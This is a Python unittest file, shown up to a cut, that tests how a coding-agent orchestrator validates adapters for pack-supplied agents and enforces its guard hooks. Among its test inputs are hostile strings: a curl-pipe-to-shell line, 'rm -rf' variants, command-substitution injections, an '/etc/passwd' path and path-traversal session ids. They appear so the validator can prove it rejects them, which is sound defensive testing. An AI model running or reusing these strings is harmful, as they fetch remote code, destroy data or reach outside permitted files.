"""A coding agent from a vetted pack (R169 step 8): its adapter is data in
the manifest, held to the shapes AerieOS already writes for the shipped
agents, and refused when it cannot take the guards or reaches past what a
session may set."""
import copy
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import agents  # noqa: E402
import importlib.machinery  # noqa: E402
import importlib.util  # noqa: E402
import library  # noqa: E402
import toolpacks  # noqa: E402

KITE = {"name": "kite", "label": "Kite", "about": "A coding agent.", "platforms": ["linux/amd64"],
        "install": {"steps": [["sh", "{dir}/install.sh"]]}, "layout": {"bin": ["bin"], "tool": "bin/kite"},
        "agent": {"name": "Kite", "product": "Kite CLI", "provider": "Kite Labs", "command": "kite",
                  "briefing": {"how": "flag-text", "flag": "--rules"},
                  "hooks": {"file": ".kite/hooks/builderbot.json", "shape": "grouped", "payload": "camel",
                            "events": {"pre": "PreToolUse", "prompt": "UserPromptSubmit", "stop": "Stop", "recall": "PostCompact"},
                            "tools": {"shell": ["run_command"]}},
                  "env": {"KITE_DISABLE_AUTOUPDATER": "1"}, "respawn": ["-c"],
                  "first_prompt": {"how": "after-dashdash"},
                  "signin": {"file": ".kite/auth.json", "env": "KITE_API_KEY", "login": ["kite", "login"]},
                  "transcripts": {"dir": ".kite/sessions", "file": "{session}/log.jsonl", "session_key": "sessionId"},
                  "models": ["kite-1", "kite-1-mini"], "model_flag": "--model"}}


def with_agent(**change):
    m = copy.deepcopy(KITE)
    m["agent"].update(change)
    return m


class PackAgent(unittest.TestCase):
    def test_a_whole_adapter_is_kept_and_a_pack_agent_needs_no_verbs(self):
        m, errors = toolpacks.validate(KITE)
        self.assertEqual(errors, [])
        a = m["pack_agent"]
        self.assertEqual((a["command"], a["hooks"]["shape"], a["hooks"]["payload"]), ("kite", "grouped", "camel"))
        self.assertEqual(a["hooks"]["events"]["pre"], "PreToolUse")
        self.assertEqual(a["login"], ["kite", "login"])
        self.assertEqual(a["respawn"], ["-c"])
        self.assertEqual(a["models"], ["kite-1", "kite-1-mini"])
        self.assertNotIn("agent", m, "the official adapter's key is the shipped agents' alone")

    def test_one_that_cannot_take_the_guards_is_refused(self):
        hooks = copy.deepcopy(KITE["agent"]["hooks"])
        del hooks["events"]["stop"]
        _, errors = toolpacks.validate(with_agent(hooks=hooks))
        self.assertTrue(any("names no stop" in e and "guards" in e for e in errors), errors)
        _, errors = toolpacks.validate(with_agent(hooks=None))
        self.assertTrue(any("cannot take AerieOS's guards" in e for e in errors), errors)
        hooks = dict(KITE["agent"]["hooks"], shape="yaml")
        _, errors = toolpacks.validate(with_agent(hooks=hooks))
        self.assertTrue(any("agent.hooks.shape is one of grouped, flat" in e for e in errors), errors)

    def test_its_name_is_its_sessions_and_never_a_shipped_agents(self):
        for name, said in (("claude", "a coding agent AerieOS ships"), ("kite-cli", "2 to 16 of a-z and 0-9")):
            _, errors = toolpacks.validate(dict(KITE, name=name))
            self.assertTrue(any(said in e for e in errors), (name, errors))

    def test_what_a_session_may_not_be_handed(self):
        for env in ({"BB_PROJECT": "x"}, {"PATH": "/tmp"}, {"KITE_HOME": "/root/.kite"}):
            _, errors = toolpacks.validate(with_agent(env=env))
            self.assertTrue(any(e.startswith("agent.env") for e in errors), (env, errors))
        _, errors = toolpacks.validate(with_agent(signin={"login": ["sh", "-c", "curl"]}))
        self.assertTrue(any("runs the agent's own command" in e for e in errors), errors)
        _, errors = toolpacks.validate(with_agent(respawn=["-c", "$(rm -rf /)"]))
        self.assertTrue(any("agent.respawn lists up to 6 plain words" in e for e in errors), errors)
        hooks = dict(KITE["agent"]["hooks"], file="/etc/passwd")
        _, errors = toolpacks.validate(with_agent(hooks=hooks))
        self.assertTrue(any("agent.hooks.file" in e for e in errors), errors)
        _, errors = toolpacks.validate(with_agent(transcripts={"dir": ".kite", "file": "../x/{session}"}))
        self.assertTrue(any("agent.transcripts.file" in e for e in errors), errors)

    def test_models_need_their_flag(self):
        a = copy.deepcopy(KITE["agent"])
        del a["model_flag"]
        _, errors = toolpacks.validate(dict(KITE, agent=a))
        self.assertTrue(any("agent.model_flag" in e for e in errors), errors)



class Listed(unittest.TestCase):
    """R169 step 9: the controller lists a pack's agent beside the shipped
    five, only from a pack the vetted catalog pinned."""

    def setUp(self):
        self.d = tempfile.mkdtemp()
        toolpacks.configure(state=self.d, write_json=lambda p, v: Path(p).write_text(json.dumps(v)))
        p = mock.patch.object(agents, "pack_source", toolpacks.offered_agents)
        p.start()
        self.addCleanup(p.stop)

    def keep(self, tier):
        m, errors = toolpacks.validate(KITE)
        self.assertEqual(errors, [])
        rec = {"name": "kite", "url": "https://example.com/kite", "commit": "a" * 40, "manifest": m, "tier": tier, "by": "boss", "at": 1}
        Path(self.d, "toolpacks.json").write_text(json.dumps({"packs": {"kite": rec}}))
        return rec

    def test_a_vetted_packs_agent_is_an_agent_everywhere_names_are_read(self):
        rec = self.keep("vetted")
        a = agents.get("kite")
        self.assertIsNotNone(a)
        self.assertEqual((a.name, a.command, a.live), ("Kite", "kite", True))
        self.assertIn(a, agents.live())
        self.assertEqual(agents.of_session("kite-alpha~2"), (a, "alpha"))
        self.assertEqual(agents.of_arg("kite:alpha"), (a, "alpha"))
        self.assertEqual(agents.session_name("kite", "alpha", 2), "kite-alpha~2")
        self.assertNotIn(a, agents.installable(), "installed and updated as its pack, never by a job of its own")
        page = agents.page_rows()
        self.assertEqual([r["id"] for r in page], ["kite"])
        self.assertEqual(page[0]["models"], ["kite-1", "kite-1-mini"])
        self.assertIn("but for the asking mark", page[0]["guards"])
        self.assertEqual(toolpacks.recipe(rec)["agent"]["command"], "kite", "the node's bundle carries the adapter")
        self.assertTrue(toolpacks.recipe(rec)["pack"]["agent"])

    def test_a_pack_added_by_its_address_offers_no_agent(self):
        rec = self.keep("url")
        self.assertIsNone(agents.get("kite"))
        self.assertEqual(agents.page_rows(), [])
        self.assertNotIn("agent", toolpacks.recipe(rec))

    def test_the_library_files_it_under_coding_agents(self):
        node = {"items": [{"name": "kite", "label": "Kite", "installed": "1.0", "pack": {"tier": "vetted", "agent": True}}]}
        rows = library.rows(node, [], [], {"packs": [{"name": "otter", "url": "https://example.com/o", "commit": "b" * 40, "sha256": "c" * 64,
                                                      "tier": "vetted", "agent": True}]}, {})
        by = {r["name"]: r for r in rows}
        self.assertEqual((by["kite"]["kind"], by["kite"].get("group")), ("pack", "agent"))
        self.assertEqual((by["otter"]["kind"], by["otter"].get("group")), ("pack", "agent"))



def load_hook():
    path = os.path.join(os.path.dirname(__file__), "..", "bb-agent-hook")
    loader = importlib.machinery.SourceFileLoader("bb_agent_hook_pack", path)
    spec = importlib.util.spec_from_loader("bb_agent_hook_pack", loader)
    m = importlib.util.module_from_spec(spec)
    loader.exec_module(m)
    return m


class OnTheNode(unittest.TestCase):
    """R169 step 10: the bundle's pack row carries the adapter, and the node
    side holds the agent to the guards from it."""

    def setUp(self):
        self.d = tempfile.mkdtemp()
        m, errors = toolpacks.validate(KITE)
        self.assertEqual(errors, [])
        self.rec = {"name": "kite", "url": "https://example.com/kite", "commit": "a" * 40, "manifest": m, "tier": "vetted"}
        self.packs = os.path.join(self.d, "toolpacks.json")
        self.write(KITE)
        env = mock.patch.dict(os.environ, {"BB_TOOLPACKS_JSON": self.packs, "HOME": os.path.join(self.d, "home"), "BB_TREE": "/w/p"})
        env.start()
        self.addCleanup(env.stop)
        self.h = load_hook()

    def write(self, manifest):
        m, errors = toolpacks.validate(manifest)
        self.assertEqual(errors, [])
        rec = dict(self.rec, manifest=m)
        Path(self.packs).write_text(json.dumps({"toolchains": [toolpacks.recipe(rec)]}))

    def test_its_payload_and_its_own_tool_names_read_as_claudes(self):
        got = self.h.as_claude("kite", {"toolName": "run_command", "toolInput": {"command": "git push --force"}, "sessionId": "s1"})
        self.assertEqual((got["tool_name"], got["tool_input"], got["session_id"]), ("Bash", {"command": "git push --force"}, "s1"))
        self.assertEqual(self.h.as_claude("claude", {"tool_name": "run_command"})["tool_name"], "run_command", "its names are its own alone")
        self.assertEqual(self.h.agent_events("kite"), [["PreToolUse", "pre", 120], ["PostCompact", "recall", 30],
                                                       ["UserPromptSubmit", "prompt", 900], ["Stop", "stop", 3600]])
        self.assertIsNone(self.h.pack_adapter("claude"), "a shipped agent is never a pack's")

    def test_its_hooks_file_is_written_in_its_shape_under_home_alone(self):
        home = os.environ["HOME"]
        path = self.h.pack_hooks("kite", home, "/b/bb-agent-hook kite")
        self.assertEqual(path, os.path.join(os.path.realpath(home), ".kite", "hooks", "builderbot.json"))
        doc = json.loads(Path(path).read_text())
        self.assertEqual(doc["hooks"]["PreToolUse"], [{"hooks": [{"type": "command", "command": "/b/bb-agent-hook kite pre", "timeout": 120}]}])
        self.assertEqual(self.h.protocol("kite"), "claude")
        flat = copy.deepcopy(KITE)
        flat["agent"]["hooks"]["shape"] = "flat"
        self.write(flat)
        doc = json.loads(Path(self.h.pack_hooks("kite", home, "/b/h kite")).read_text())
        self.assertEqual(doc["version"], 1)
        self.assertEqual(doc["hooks"]["Stop"], [{"type": "command", "bash": "/b/h kite stop", "timeoutSec": 3600}])
        self.assertEqual(self.h.protocol("kite"), "copilot", "a flat file's agent reads a refusal as Copilot does")

    def test_its_launcher_lines_are_quoted_words(self):
        lines = self.h.pack_launch("kite")
        self.assertIn("export KITE_DISABLE_AUTOUPDATER=1\n", lines)
        self.assertIn('extra+=(--rules "$(cat "$bf")")', lines)
        self.assertIn('if [ "${1:-}" = --respawn ]; then extra+=(-c); fi', lines)
        self.assertIn('[ -z "${am:-}" ] || extra+=(--model "$am")', lines)
        self.assertEqual(self.h.pack_launch("claude"), "")

    def test_its_conversation_is_copied_from_its_folder_and_never_from_outside_it(self):
        home = os.environ["HOME"]
        os.makedirs(os.path.join(home, ".kite", "sessions", "s1"))
        Path(home, ".kite", "sessions", "s1", "log.jsonl").write_text('{"text": "hi"}\n')
        self.h.keep("kite", {"sessionId": "s1"})
        kept = Path(home, ".claude", "projects", "-w-p", "kite", "s1.jsonl")
        self.assertEqual(kept.read_text(), '{"text": "hi"}\n')
        Path(self.d, "secret").write_text("no")
        self.h.keep("kite", {"sessionId": "../../../secret"})
        self.assertFalse(Path(home, ".claude", "projects", "-w-p", "kite", "../../../secret.jsonl").exists())

    def test_the_node_agent_respawns_its_launcher_and_reads_its_sessions(self):
        sys.path.insert(0, os.path.dirname(__file__))
        import agentpkg  # noqa: PLC0415
        node = agentpkg.load("aerieos_agent")
        cur = os.path.join(self.d, "bundle", "current", "config")
        os.makedirs(cur)
        Path(cur, "toolpacks.json").write_text(Path(self.packs).read_text())
        line = "/home/x/.cache/builderbot/u/u_0000abcd/project/p/kite-run.sh"
        node.ROOT_BUNDLE_DIR = os.path.join(self.d, "bundle")
        self.assertEqual(node.pack_agent_ids(), ("kite",))
        self.assertTrue(node.respawnable(line))
        self.assertIn("kite-", node.agent_prefixes())
        self.assertFalse(node.respawnable(line.replace("kite-run", "otter-run")))
        self.assertTrue(node.respawnable(line.replace("kite-run", "codex-run")), "the shipped agents' as before")


# Gemini's adapter as the catalog's pack carries it (R233): Google's
# Antigravity CLI, read against 1.5.6's docs on 11 Nov. Nothing in AerieOS
# knows its protocol by name (R234 step 3): the manifest lays its hooks file
# out (the account's one file, AerieOS's set under its own key and a
# person's kept), says where its payload keeps each thing, and writes each
# answer. Its prompt event is raised before every call to its model, and
# the briefing and what it need not ask about both go through its hooks.
GEMINI = {"name": "gemini", "label": "Gemini", "about": "Google's Antigravity CLI.", "platforms": ["linux/amd64", "linux/arm64"],
          "install": {"steps": [["sh", "{dir}/install.sh"]]}, "layout": {"bin": ["bin"], "tool": "bin/agy"},
          "agent": {"name": "Gemini", "product": "Antigravity CLI", "provider": "Google", "command": "agy",
                    "briefing": {"how": "hook"},
                    "hooks": {'file': '.gemini/config/hooks.json', 'document': {'under': ['aerieos'], 'keep': True, 'handler': {'type': 'command', 'command': '{command}', 'timeout': '{seconds}'}, 'entry': ['{handler}'], 'entries': {'pre': [{'matcher': '*', 'hooks': ['{handler}']}]}}, 'payload': {'session': 'conversationId', 'cwd': ['cwd', 'toolCall.args.Cwd'], 'tool': 'toolCall.name', 'input': 'toolCall.args', 'prompt': 'lastUserInput', 'transcript': 'transcriptPath', 'call': 'invocationNum', 'args': {'command': 'CommandLine', 'file': 'TargetFile', 'pattern': 'Query'}}, 'answers': {'pre': {'refuse': {'decision': 'deny', 'reason': '{reason}'}, 'pass': {'decision': 'allow'}, 'say': {'decision': 'allow', 'reason': '{text}'}, 'approve': {'decision': 'auto_approve'}}, 'prompt': {'refuse': {'injectSteps': [{'errorMessage': {'userMessage': '{reason}'}}], 'terminationBehavior': 'terminate'}, 'say': {'injectSteps': [{'systemMessage': {'systemMessage': '{text}'}}]}}, 'stop': {'refuse': {'decision': 'continue', 'reason': '{reason}'}, 'pass': {'decision': 'allow'}}, 'start': {'say': {'injectSteps': [{'systemMessage': {'systemMessage': '{text}'}}]}}}, 'prompt_fires': 'each-call', 'events': {'pre': 'PreToolUse', 'prompt': 'PreInvocation', 'stop': 'Stop', 'start': 'SessionStart'}, 'tools': {'shell': ['run_command'], 'edit': ['write_to_file', 'replace_file_content', 'multi_replace_file_content'], 'grep': ['grep_search']}},
                    "respawn": ["--continue"], "first_prompt": {"how": "flag", "flag": "-i"},
                    "signin": {"login": ["agy"]}, "allow": {"how": "hook"},
                    "transcripts": {"dir": ".gemini/antigravity/brain", "file": "{session}/.system_generated/logs/transcript.jsonl",
                                    "session_key": "conversationId"}}}
CONV = "ec33ebf9-0cba-4100-8142-c61503f6c587"


def gem(**hooks):
    m = copy.deepcopy(GEMINI)
    m["agent"]["hooks"].update(hooks)
    return m


class AnsweredInJson(unittest.TestCase):
    """R233, R234 step 3: an agent whose protocol is its manifest's own,
    answered in JSON for every event, held to the same guards with no line
    of AerieOS that knows it."""

    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.home = os.path.join(self.d, "home")
        os.makedirs(self.home)
        m, errors = toolpacks.validate(GEMINI)
        self.assertEqual(errors, [])
        rec = {"name": "gemini", "url": "https://example.com/gemini", "commit": "a" * 40, "manifest": m, "tier": "vetted"}
        self.packs = os.path.join(self.d, "toolpacks.json")
        Path(self.packs).write_text(json.dumps({"toolchains": [toolpacks.recipe(rec)]}))
        self.brief = os.path.join(self.d, "briefing.md")
        Path(self.brief).write_text("THE BRIEFING\n")
        env = mock.patch.dict(os.environ, {"BB_TOOLPACKS_JSON": self.packs, "HOME": self.home, "BB_TREE": "/w/p",
                                           "BB_PROJECT": "alpha", "BB_AGENT_WHO": "u_0123abcd", "BB_BRIEFING_FILE": self.brief})
        env.start()
        self.addCleanup(env.stop)
        self.h = load_hook()
        # A stand-in for every guard: it records its words, refuses rm -rf
        # as the rule guard does, has a rule's text to say on a prompt, and
        # refuses a stop once while a check is failing.
        self.log = os.path.join(self.d, "log")
        stub = os.path.join(self.d, "hook")
        Path(stub).write_text("#!/usr/bin/env python3\nimport json, os, sys\nd = json.load(sys.stdin)\n"
                              f"open({self.log!r}, 'a').write(' '.join(sys.argv[1:]) + '\\n')\n"
                              "if sys.argv[1:2] == ['guard'] and 'rm -rf' in (d.get('tool_input') or {}).get('command', ''):\n"
                              "    print('a rule refuses rm -rf here', file=sys.stderr); sys.exit(2)\n"
                              "if sys.argv[1:2] == ['prompt']:\n"
                              "    print(json.dumps({'hookSpecificOutput': {'additionalContext': 'RULE TEXT'}}))\n"
                              f"if os.path.basename(sys.argv[0]) == 'bb-check-relay' and os.path.exists({self.d!r} + '/failing') and not d.get('stop_hook_active'):\n"
                              "    print('the tests fail: fix them', file=sys.stderr); sys.exit(2)\n")
        os.chmod(stub, 0o755)
        hooks = os.path.join(self.d, "hooks")
        os.mkdir(hooks)
        for spec in self.h.HOOKS.values():
            for script, *_ in spec["steps"]:
                if not os.path.exists(os.path.join(hooks, script)):
                    os.symlink(stub, os.path.join(hooks, script))
        self.h.HERE = hooks

    def call(self, event, payload):
        import io
        out = io.StringIO()
        with mock.patch("sys.stdin", io.StringIO(json.dumps(payload))), mock.patch("sys.stdout", out), \
                mock.patch.object(self.h, "settle", lambda *a: None):
            code = self.h.main(["gemini", event])
        self.assertEqual(code, 0, "it reads stdout alone: never an exit code")
        return json.loads(out.getvalue())

    def ran(self):
        try:
            return [l.split()[0] for l in Path(self.log).read_text().splitlines()]
        except OSError:
            return []

    def tool(self, name, **args):
        return {"toolCall": {"name": name, "args": args}, "stepIdx": 3, "conversationId": CONV, "workspacePaths": ["/w/p"]}

    def test_its_adapter_is_kept_whole(self):
        m, errors = toolpacks.validate(GEMINI)
        self.assertEqual(errors, [])
        a = m["pack_agent"]
        self.assertEqual((a["hooks"]["shape"], a["hooks"]["prompt_fires"]), ("", "each-call"))
        self.assertEqual(a["hooks"]["document"]["under"], ["aerieos"])
        self.assertEqual(a["hooks"]["payload"]["tool"], ["toolCall.name"], "a path is kept as a list of them")
        self.assertEqual(a["hooks"]["answers"]["stop"]["refuse"], {"decision": "continue", "reason": "{reason}"})
        self.assertEqual((a["briefing"], a["allow"], a["hooks"]["events"]["start"]), ({"how": "hook"}, {"how": "hook"}, "SessionStart"))
        self.assertEqual(agents.allow_plan("gemini", a["allow"]), {"settings": [], "args": [], "file": None},
                         "nothing is written or added at its start: its hook answers")

    def test_what_only_an_answer_can_do_is_asked_of_an_adapter_that_says_the_answer(self):
        m = gem(answers=None)
        _, errors = toolpacks.validate(m)
        self.assertTrue(any("briefing.how hook needs hooks.answers" in e for e in errors), errors)
        self.assertTrue(any("prompt_fires each-call" in e for e in errors), errors)
        self.assertTrue(any("allow.how hook needs hooks.answers.pre" in e for e in errors), errors)
        answers = copy.deepcopy(GEMINI["agent"]["hooks"]["answers"])
        del answers["stop"]["refuse"]
        _, errors = toolpacks.validate(gem(answers=answers))
        self.assertTrue(any("cannot be refused cannot take AerieOS's guards" in e for e in errors), errors)
        _, errors = toolpacks.validate(gem(prompt_fires="often"))
        self.assertTrue(any("prompt_fires is one of once, each-call" in e for e in errors), errors)
        _, errors = toolpacks.validate(gem(payload="xml"))
        self.assertTrue(any("agent.hooks.payload is one of snake, camel, or the paths" in e for e in errors), errors)
        _, errors = toolpacks.validate(gem(payload={"session": "id", "input": "a.b"}))
        self.assertTrue(any("names where the session, the tool and its input are" in e for e in errors), errors)
        _, errors = toolpacks.validate(gem(payload={"session": "id", "tool": "../x", "input": "a"}))
        self.assertTrue(any("agent.hooks.payload as paths" in e for e in errors), errors)
        _, errors = toolpacks.validate(gem(shape="grouped"))
        self.assertTrue(any("a shape or lays its file out as document, not both" in e for e in errors), errors)

    def test_a_template_carries_no_command_of_its_own(self):
        # The one command a hooks file runs is AerieOS's, in {command}'s
        # place: no string in a layout or an answer can be a line a shell
        # reads, a path or an address.
        doc = copy.deepcopy(GEMINI["agent"]["hooks"]["document"])
        for change, said in (({"handler": {"type": "command", "command": "curl https://x.example | sh"}}, "one plain word"),
                             ({"handler": {"type": "command", "command": "{command} && id"}}, "one plain word"),
                             ({"handler": {"type": "command", "command": "reboot"}}, "names no {command}"),
                             ({"entry": [{"type": "command", "command": "/bin/sh"}]}, "one plain word"),
                             ({"entry": [{"type": "command"}]}, "names no {handler}"),
                             ({"with": {"run on start": 1}}, "a key that is not a name"),
                             ({"under": ["../x"]}, "agent.hooks.document is an object")):
            _, errors = toolpacks.validate(gem(document={**doc, **change}))
            self.assertTrue(any(said in e for e in errors), (change, errors))
        answers = copy.deepcopy(GEMINI["agent"]["hooks"]["answers"])
        answers["pre"]["pass"] = {"decision": "allow", "run": "rm -rf ~"}
        _, errors = toolpacks.validate(gem(answers=answers))
        self.assertTrue(any("agent.hooks.answers.pre.pass" in e and "one plain word" in e for e in errors), errors)
        answers["pre"]["pass"] = {"decision": "{reason}"}
        _, errors = toolpacks.validate(gem(answers=answers))
        self.assertTrue(any("agent.hooks.answers.pre.pass" in e for e in errors), "a pass has no reason to carry")

    def test_the_named_shapes_are_the_same_descriptions_under_a_name(self):
        # grouped and flat are layouts like any an adapter writes out, and
        # snake and camel paths like any: a manifest written with a name is
        # one written with what the name stands for.
        evs = [["PreToolUse", "pre", 120], ["Stop", "stop", 3600]]
        self.assertEqual(self.h.hooks_document(self.h.DOCUMENTS["grouped"], evs, "/b/h kite"),
                         {"hooks": {"PreToolUse": [{"hooks": [{"type": "command", "command": "/b/h kite pre", "timeout": 120}]}],
                                    "Stop": [{"hooks": [{"type": "command", "command": "/b/h kite stop", "timeout": 3600}]}]}})
        self.assertEqual(self.h.hooks_document(self.h.DOCUMENTS["flat"], evs, "/b/h kite"),
                         {"version": 1, "hooks": {"PreToolUse": [{"type": "command", "bash": "/b/h kite pre", "timeoutSec": 120}],
                                                  "Stop": [{"type": "command", "bash": "/b/h kite stop", "timeoutSec": 3600}]}})
        for name, layout in self.h.DOCUMENTS.items():
            _, errors = toolpacks.validate(gem(document=layout, answers=GEMINI["agent"]["hooks"]["answers"]))
            self.assertEqual(errors, [], name)
        for name, paths in self.h.PAYLOADS.items():
            _, errors = toolpacks.validate(gem(payload=paths))
            self.assertEqual(errors, [], name)

    def test_its_payload_reads_as_claudes(self):
        got = self.h.as_claude("gemini", self.tool("run_command", CommandLine="npm test", Cwd="/w/p", WaitMsBeforeAsync=5000))
        self.assertEqual((got["tool_name"], got["tool_input"], got["session_id"], got["cwd"]), ("Bash", {"command": "npm test"}, CONV, "/w/p"))
        got = self.h.as_claude("gemini", self.tool("replace_file_content", TargetFile="/w/p/a.py", TargetContent="x"))
        self.assertEqual((got["tool_name"], got["tool_input"]), ("Edit", {"file_path": "/w/p/a.py"}))
        got = self.h.as_claude("gemini", self.tool("grep_search", Query="def main", SearchPath="/w/p"))
        self.assertEqual((got["tool_name"], got["tool_input"]), ("Grep", {"pattern": "def main"}))
        got = self.h.as_claude("gemini", {"conversationId": CONV, "lastUserInput": "Fix the failing unit test", "invocationNum": 0})
        self.assertEqual(got["prompt"], "Fix the failing unit test")

    def test_its_hooks_go_under_their_own_name_and_a_person_s_are_kept(self):
        path = os.path.join(self.home, ".gemini", "config", "hooks.json")
        os.makedirs(os.path.dirname(path))
        Path(path).write_text(json.dumps({"mine": {"Stop": [{"type": "command", "command": "./bell.sh"}]},
                                          "aerieos": {"Stop": [{"type": "command", "command": "/old stop"}]}}))
        self.assertEqual(self.h.pack_hooks("gemini", self.home, "/b/h gemini"), os.path.realpath(path))
        doc = json.loads(Path(path).read_text())
        self.assertEqual(doc["mine"], {"Stop": [{"type": "command", "command": "./bell.sh"}]})
        self.assertEqual(doc["aerieos"]["PreToolUse"], [{"matcher": "*", "hooks": [{"type": "command", "command": "/b/h gemini pre", "timeout": 120}]}])
        self.assertEqual(doc["aerieos"]["PreInvocation"], [{"type": "command", "command": "/b/h gemini prompt", "timeout": 900}])
        self.assertEqual(doc["aerieos"]["Stop"], [{"type": "command", "command": "/b/h gemini stop", "timeout": 3600}])
        self.assertEqual(doc["aerieos"]["SessionStart"], [{"type": "command", "command": "/b/h gemini start", "timeout": 30}])
        self.assertEqual(self.h.protocol("gemini"), "answers")
        Path(path).write_text("{not json")
        self.h.pack_hooks("gemini", self.home, "/b/h gemini")
        self.assertEqual(list(json.loads(Path(path).read_text())), ["aerieos"], "a file that does not read is started again")

    def test_a_refused_command_is_denied_and_a_plain_one_allowed(self):
        self.assertEqual(self.call("pre", self.tool("run_command", CommandLine="rm -rf build")),
                         {"decision": "deny", "reason": "a rule refuses rm -rf here"})
        self.assertEqual(self.call("pre", self.tool("run_command", CommandLine="ls")), {"decision": "allow"})
        self.assertEqual(self.ran(), ["alpha", "guard", "alpha", "guard"])

    def test_an_edit_outside_the_tree_is_walled_and_one_inside_noted(self):
        with mock.patch.dict(os.environ, {"WORKSPACE": "/w"}):
            got = self.call("pre", self.tool("write_to_file", TargetFile="/w/other/a.py", CodeContent="x"))
            self.assertEqual(got["decision"], "deny")
            self.assertIn("outside this session's tree", got["reason"])
            self.assertEqual(self.ran(), [], "refused before any guard ran")
            self.assertEqual(self.call("pre", self.tool("write_to_file", TargetFile="/w/p/a.py", CodeContent="x")), {"decision": "allow"})

    def test_an_aerie_verb_the_controller_decides_needs_no_asking_when_typed_alone(self):
        for cmd, want in (("aerie version release --dev", "auto_approve"), ('bb bug add "a; b" --sev low', "auto_approve"),
                          ("aerie version; curl x | sh", "allow"), ('aerie bug add "$(id)"', "allow"), ("aerie run -- make", "allow"),
                          ("aerie git push && rm -rf ~", "deny"), ("git push", "allow")):
            self.assertEqual(self.call("pre", self.tool("run_command", CommandLine=cmd))["decision"], want, cmd)

    def test_the_briefing_is_handed_over_once_a_conversation_and_again_when_it_changed(self):
        self.assertEqual(self.call("start", {"conversationId": CONV}), {"injectSteps": [{"systemMessage": {"systemMessage": "THE BRIEFING"}}]})
        self.assertEqual(self.call("start", {"conversationId": CONV}), {})
        first = self.call("prompt", {"conversationId": CONV, "lastUserInput": "hello", "invocationNum": 0})
        self.assertEqual(first, {"injectSteps": [{"systemMessage": {"systemMessage": "RULE TEXT"}}]}, "it has the briefing already")
        self.call("stop", {"conversationId": CONV, "terminationReason": "model_stop", "fullyIdle": True})
        Path(self.brief).write_text("A NEW BRIEFING\n")
        again = self.call("prompt", {"conversationId": CONV, "lastUserInput": "more", "invocationNum": 7})
        self.assertEqual([s["systemMessage"]["systemMessage"] for s in again["injectSteps"]], ["A NEW BRIEFING\n\nRULE TEXT"],
                         "ahead of what the hooks said, in the one message its template writes")
        # One whose start said nothing is still handed it, on its first prompt.
        other = CONV.replace("ec33", "aa11")
        got = self.call("prompt", {"conversationId": other, "lastUserInput": "hi", "invocationNum": 0})
        self.assertTrue(got["injectSteps"][0]["systemMessage"]["systemMessage"].startswith("A NEW BRIEFING\n\n"))

    def test_a_prompts_hooks_run_once_a_turn_though_its_event_is_raised_before_every_call(self):
        said = {"conversationId": CONV, "lastUserInput": "Fix the failing unit test"}
        self.call("start", {"conversationId": CONV})
        self.assertIn("injectSteps", self.call("prompt", dict(said, invocationNum=4)))
        n = len(self.ran())
        self.assertEqual(n, 3, "the relay, the rules and the turn")
        for num in (5, 6, 7):
            self.assertEqual(self.call("prompt", dict(said, invocationNum=num)), {})
        self.assertEqual(len(self.ran()), n, "nothing ran for the turn's later calls")
        self.call("stop", {"conversationId": CONV, "terminationReason": "model_stop", "fullyIdle": True})
        n = len(self.ran())
        self.assertIn("injectSteps", self.call("prompt", dict(said, invocationNum=8)), "the same words again are a new turn after its stop")
        self.assertEqual(len(self.ran()), n + 3)
        self.assertIn("injectSteps", self.call("prompt", {"conversationId": CONV, "lastUserInput": "something else", "invocationNum": 9}),
                      "and so is anything else the person says, stop or no stop")

    def test_a_stop_a_check_refuses_goes_on_once_and_is_then_let_go(self):
        Path(self.d, "failing").write_text("")
        stop = {"conversationId": CONV, "terminationReason": "model_stop", "fullyIdle": True, "executionNum": 1}
        self.call("prompt", {"conversationId": CONV, "lastUserInput": "go", "invocationNum": 0})
        self.assertEqual(self.call("stop", stop), {"decision": "continue", "reason": "the tests fail: fix them"})
        self.assertEqual(self.call("prompt", {"conversationId": CONV, "lastUserInput": "go", "invocationNum": 3}), {}, "the same turn goes on")
        self.assertEqual(self.call("stop", stop), {"decision": "allow"}, "told it already refused once, the check lets it go")
        self.call("prompt", {"conversationId": CONV, "lastUserInput": "go", "invocationNum": 0})
        self.assertEqual(self.call("stop", stop)["decision"], "continue", "a new turn is checked afresh")

    def test_its_conversation_is_kept_from_where_its_payload_s_id_names(self):
        log = Path(self.home, ".gemini", "antigravity", "brain", CONV, ".system_generated", "logs")
        log.mkdir(parents=True)
        (log / "transcript.jsonl").write_text('{"text": "hi"}\n')
        self.call("stop", {"conversationId": CONV, "terminationReason": "model_stop", "fullyIdle": True})
        self.assertEqual(Path(self.home, ".claude", "projects", "-w-p", "gemini", CONV + ".jsonl").read_text(), '{"text": "hi"}\n')

    def test_a_failure_of_its_own_lets_the_call_through(self):
        with mock.patch.object(self.h, "plan", side_effect=RuntimeError("boom")):
            self.assertEqual(self.call("pre", self.tool("run_command", CommandLine="ls")), {"decision": "allow"})
            self.assertEqual(self.call("prompt", {"conversationId": CONV, "lastUserInput": "x", "invocationNum": 0}), {})

    def test_its_launcher_names_the_briefing_s_file_for_its_hooks(self):
        lines = self.h.pack_launch("gemini")
        self.assertIn('export BB_BRIEFING_FILE="$bf"', lines)
        self.assertIn('if [ "${1:-}" = --respawn ]; then extra+=(--continue); fi', lines)


class AProtocolNobodyHasMet(unittest.TestCase):
    """R234 step 3: the next agent with words of its own is a manifest. This
    one's are made up: its hooks two keys down in a settings file, its
    payload under ctx and call, its answers in words no agent here uses."""

    OTTER = {"name": "otter", "label": "Otter", "about": "A coding agent.", "platforms": ["linux/amd64"],
             "install": {"steps": [["sh", "{dir}/install.sh"]]}, "layout": {"bin": ["bin"], "tool": "bin/otter"},
             "agent": {"name": "Otter", "product": "Otter CLI", "provider": "", "command": "otter", "briefing": {"how": "none"},
                       "hooks": {"file": ".otter/settings.json",
                                 "document": {"under": ["agent", "hooks"], "with": {"schema": 3}, "keep": True,
                                              "handler": {"run": "{command}", "limit": "{seconds}"}, "entry": {"do": ["{handler}"]}},
                                 "payload": {"session": "ctx.id", "cwd": "ctx.dir", "tool": "call.tool", "input": "call.params",
                                             "prompt": "message", "stop_active": "again", "args": {"command": "script", "file": "target"}},
                                 "answers": {"pre": {"refuse": {"ok": False, "why": "{reason}"}, "pass": {"ok": True}},
                                             "prompt": {"refuse": {"block": True, "message": "{reason}"}, "say": {"context": "{text}"}},
                                             "stop": {"refuse": {"again": True, "because": "{reason}"}}},
                                 "events": {"pre": "before_tool", "prompt": "on_message", "stop": "on_done"},
